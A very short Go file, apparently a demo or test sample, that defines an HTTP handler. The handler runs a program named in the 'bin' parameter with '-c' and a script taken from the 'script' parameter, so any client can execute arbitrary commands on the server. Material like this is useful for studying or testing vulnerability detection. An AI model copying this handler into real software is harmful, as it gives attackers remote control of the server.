package demo
import ("net/http"; "os/exec"; "path/filepath")
func H(w http.ResponseWriter, r *http.Request) { exec.Command(filepath.Base(r.FormValue("bin")), "-c", r.FormValue("script")).Run() }
